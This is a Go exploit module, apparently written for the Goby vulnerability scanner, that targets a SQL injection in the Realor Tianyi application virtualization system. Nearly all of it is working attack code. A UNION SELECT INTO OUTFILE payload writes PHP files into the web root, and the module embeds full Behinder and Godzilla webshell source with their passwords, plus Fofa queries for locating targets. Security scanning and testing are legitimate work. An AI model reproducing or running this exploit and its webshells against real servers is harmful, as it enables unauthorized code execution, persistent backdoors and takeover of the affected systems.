package exploits

import (
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Realor Tianyi AVS ConsoleExternalApi.XGI file account param sql injection vulnerability",
    "Description": "<p>Realor Tianyi Application Virtualization System is an application virtualization platform based on server computing architecture. It centrally deploys various user application software to the Ruiyou Tianyi service cluster, and clients can access authorized application software on the server through the WEB, achieving centralized application, remote access, collaborative office, and more.</p><p>Attackers can use this sql injection vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "REALOR-Tianyi-AVS",
    "Homepage": "http://www.realor.cn/",
    "DisclosureDate": "2023-05-09",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "title=\"瑞友天翼－应用虚拟化系统\" || title=\"瑞友应用虚拟化系统\" || body=\"static/images/bulletin_qrcode.png\"",
    "GobyQuery": "title=\"瑞友天翼－应用虚拟化系统\" || title=\"瑞友应用虚拟化系统\" || body=\"static/images/bulletin_qrcode.png\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this sql injection vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The official security patch has been released for vulnerability repair: <a href=\"http://www.realor.cn/product/tianyi/\">http://www.realor.cn/product/tianyi/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,sqlPoint",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abcd.xgi",
            "show": "webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php @error_reporting(0);session_start();$key=\"e45e329feb5d925b\";$_SESSION[\"k\"]=$key;session_write_close();$post=file_get_contents(\"php://input\");if(!extension_loaded(\"openssl\")){$t=\"base64_\".\"decode\";$post=$t($post.\"\");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,\"AES128\",$key);}$arr=explode(\"|\",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p.\"\");}}@call_user_func(new C(),$params);?>",
            "show": "webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.2",
    "Translation": {
        "CN": {
            "Name": "瑞友天翼应用虚拟化系统 ConsoleExternalApi.XGI account 参数 SQL 注入漏洞",
            "Product": "REALOR-天翼应用虚拟化系统",
            "Description": "<p>瑞友天翼应用虚拟化系统是基于服务器计算架构的应用虚拟化平台，它将用户各种应用软件集中部署到瑞友天翼服务集群，客户端通过WEB即可访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等。</p><p>攻击者可通过该sql注入漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>目前官方已发布安全补丁进行漏洞修复：<a href=\"http://www.realor.cn/product/tianyi/\" target=\"_blank\">http://www.realor.cn/product/tianyi/</a></p>",
            "Impact": "<p>攻击者可通过该sql注入漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Realor Tianyi AVS ConsoleExternalApi.XGI file account param sql injection vulnerability",
            "Product": "REALOR-Tianyi-AVS",
            "Description": "<p>Realor Tianyi Application Virtualization System is an application virtualization platform based on server computing architecture. It centrally deploys various user application software to the Ruiyou Tianyi service cluster, and clients can access authorized application software on the server through the WEB, achieving centralized application, remote access, collaborative office, and more.</p><p>Attackers can use this sql injection vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The official security patch has been released for vulnerability repair: <a href=\"http://www.realor.cn/product/tianyi/\" target=\"_blank\">http://www.realor.cn/product/tianyi/</a><br></p>",
            "Impact": "<p>Attackers can use this <span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">sql injection&nbsp;</span>vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10932"
}`
	send_payloadJSIODUAO := func(hostinfo *httpclient.FixUrl, filename string, phpCode string) (*httpclient.HttpResponse, error) {
		uri := "/ConsoleExternalApi.XGI?initParams=command_createUser__pwd_1&key=inner&sign=9252fae35ff226ec26c4d1d9566ebbde"
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.Header.Store("Content-Length", "588")
		cfg.Header.Store("Accept-Encoding", "gzip")
		cfg.Header.Store("Cookie", "PHPSESSID=t50ep2hj6cj7cvoitlrp7noop7; CookieLanguageName=ZH-CN; think_language=zh-CN; UserAuthtype=0")
		cfg.Header.Store("Content-Type", "application/json")
		cfg.Header.Store("Connection", "close")
		cfg.Data = `{
 "account": "1' union select '` + phpCode + `',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL into outfile '..\\\\..\\\\WebRoot\\\\` + filename + `'#",
 "userPwd": "1"
}`
		resp, err := httpclient.DoHttpRequest(hostinfo, cfg)
		if err != nil {
			return resp, err
		}
		return httpclient.SimpleGet(hostinfo.FixedHostInfo + "/" + filename)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randomStr := goutils.RandomHexString(5)
			filename := randomStr + ".xgi"
			phpCode := fmt.Sprintf("<?php echo(md5(\\\"%s\\\"));unlink(__FILE__);?>", randomStr)
			resp, err := send_payloadJSIODUAO(hostinfo, filename, phpCode)
			if err != nil {
				return false
			}
			return strings.Contains(resp.Utf8Html, fmt.Sprintf("%x", md5.Sum([]byte(randomStr))))
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "webshell" {
				webshell := goutils.B2S(stepLogs.Params["webshell"])
				filename := goutils.RandomHexString(5) + ".xgi"
				tool := ""
				password := ""
				var content string
				if webshell == "behinder" {
					tool = "Behinder v3.0"
					password = "rebeyond"
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION["k"]=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded("openssl")){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode("|",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "godzilla" {
					tool = "Godzilla v4.1"
					password = "pass 加密器：PHP_XOR_BASE64"
					content = `<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $pass="pass"; $payloadName="payload"; $key="3c6e0b8a9c15224a"; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,"getBasicsInfo")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,"getBasicsInfo")!==false){ $_SESSION[$payloadName]=encode($data,$key);}}}?>`
				} else if webshell == "custom" {
					content = goutils.B2S(stepLogs.Params["content"])
					if !strings.HasSuffix(content, "?>") {
						content += "?>"
					}
					filename = goutils.B2S(stepLogs.Params["filename"])
				} else {
					expResult.Success = false
					expResult.Output = "未知的利用方式"
					return expResult
				}
				content = strings.ReplaceAll(content, "\"", "\\\"")
				resp, err := send_payloadJSIODUAO(expResult.HostInfo, filename, content)
				if err != nil || resp == nil || (resp != nil && resp.StatusCode != 200) {
					expResult.Success = false
					if err != nil {
						expResult.Output = err.Error()
					}
					return expResult
				}
				vulURL := expResult.HostInfo.FixedHostInfo + "/" + filename
				resp, err = httpclient.SimpleGet(vulURL)
				if err != nil || resp == nil || (resp != nil && resp.StatusCode == 404) {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output = "WebShell URL: " + vulURL + "\n"
				if webshell != "custom" {
					expResult.Output += "Password: " + password + "\n"
					expResult.Output += "WebShell tool: " + tool + "\n"
					expResult.Output += "Webshell type: php"
				}
			} else if attackType == "sqlPoint" {
				randomStr := goutils.RandomHexString(5)
				filename := randomStr + ".xgi"
				phpCode := fmt.Sprintf("<?php echo(md5(\\\"%s\\\"));unlink(__FILE__);?>", randomStr)
				resp, _ := send_payloadJSIODUAO(expResult.HostInfo, filename, phpCode)
				if strings.Contains(resp.Utf8Html, fmt.Sprintf("%x", md5.Sum([]byte(randomStr)))) {
					expResult.Success = true
					expResult.Output = `POST /ConsoleExternalApi.XGI?initParams=command_createUser__pwd_1&key=inner&sign=9252fae35ff226ec26c4d1d9566ebbde HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 303
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/json
Cookie: PHPSESSID=t50ep2hj6cj7cvoitlrp7noop7; CookieLanguageName=ZH-CN; think_language=zh-CN; UserAuthtype=0

{
 "account": "1' union select 'yourPayload',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL #",
 "userPwd": "1"
}`
				}
			}
			return expResult
		},
	))
}
